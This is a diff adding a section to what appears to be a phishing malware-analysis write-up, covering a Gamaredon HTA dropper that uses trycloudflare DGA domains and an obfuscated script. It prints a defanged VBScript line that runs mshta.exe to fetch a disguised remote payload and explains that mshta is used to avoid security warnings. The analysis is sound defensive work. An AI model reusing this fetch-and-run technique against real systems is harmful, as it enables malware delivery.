@@ -109,3 +109,26 @@ This JavaScript code is trying to run a hidden **PowerShell command** using `msh
 
 Then, after researching the d.ps1 file, I found that it is obfuscated, which further on de-obfuscating, I found it has been downloading another ZIP file containing malware known as gs.zip , which contains the final payload.
 
+
+### Case 3 : Gamaredon using HTA to drop further malware.
+
+In this case, the file I found during the initial phishing analysis is an HTA file, which is a combination of HTML and VBScript.
+
+![image_gam1](https://github.com/user-attachments/assets/76e4c57a-55e8-403b-8dff-c079730184f8)
+
+
+When I analyzed this HTML file, I found multiple IP addresses and several **Domain Generation Algorithm (DGA)** domains associated with the **trycloudflare[.]com** website, as shown in the image below. **DGAs** are used by attackers to generate a large number of domain names dynamically, making it harder for security solutions to block them.
+
+![image_gam2](https://github.com/user-attachments/assets/745bdd5d-de01-4c96-a969-39a54cf76a45)
+
+
+Additionally, I discovered a **malicious script** embedded within the HTML file. Instead of being directly visible, the script was stored in a **string format** and was later reconstructed by concatenation. Once decoded, it was found to be executing another script, which could potentially download or execute additional payloads.
+
+Now, let's analyze this script further to understand its purpose and behavior.
+
+`CreateObject("WScript.Shell")[.]Run  "%windir%\system32\mshta[.]exe " &  "hxxps://louise-gzip-think-air.trycloudflare.com/OD/rotI7D/shortlyqXW.tif”`
+
+This script basically accesses the **Windows Shell** and runs `mshta.exe`. The likely reason for using `mshta.exe` is to execute the script **without triggering any security warnings**.
+
+Additionally, the script contains a **remote URL** that appears to download a file with a `.tif` extension. However, I suspect that this is actually a **malicious payload** being fetched from a **C2 server** rather than a legitimate image file.
+
